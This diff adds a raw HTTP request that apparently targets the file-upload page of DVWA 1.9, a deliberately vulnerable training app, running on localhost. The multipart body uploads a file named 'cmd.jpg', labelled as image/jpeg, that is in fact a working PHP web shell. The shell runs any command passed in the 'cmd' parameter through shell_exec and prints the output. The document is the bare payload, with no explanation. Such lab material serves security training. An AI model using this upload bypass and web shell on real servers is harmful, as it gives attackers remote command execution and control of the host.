@@ -1,0 +1,51 @@
+POST /dvwa-1.9/vulnerabilities/upload/ HTTP/1.1
+Host: localhost
+Content-Length: 742
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN6IA31wLEcdKVqn6
+Referer: http://localhost/dvwa-1.9/vulnerabilities/upload/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8
+Cookie: security=medium; pgv_pvi=8928542720; Hm_lvt_0a8b0d0d0f05cb8727db5cc8d1f0dc08=1505118977; a5787_times=1; a3564_times=1; Hm_lvt_82116c626a8d504a5c0675073362ef6f=1508114987,1508199694,1508297809,1508373269; PHPSESSID=p4csmc9ictb94a5bd1slflvrv7
+Connection: close
+
+------WebKitFormBoundaryN6IA31wLEcdKVqn6
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+
+100000
+------WebKitFormBoundaryN6IA31wLEcdKVqn6
+Content-Disposition: form-data; name="uploaded"; filename="cmd.jpg"
+Content-Type: image/jpeg
+
+<?php
+    $cmd = isset($_GET['cmd']) && !empty($_GET['cmd']) ? $_GET['cmd'] : '';
+?>
+ 
+<html>
+<head></head>
+<body>
+<div>
+<form action="cmd.php" method="get">
+    input cmd:<input type="text" name="cmd"/>
+</form>
+</div>
+<div>
+<pre>
+<?php
+    if ( $cmd != '' ) {
+        echo shell_exec($cmd);
+    }
+?>
+</pre>
+</div>
+</body>
+</html>
+------WebKitFormBoundaryN6IA31wLEcdKVqn6
+Content-Disposition: form-data; name="Upload"
+
+Upload
+------WebKitFormBoundaryN6IA31wLEcdKVqn6--
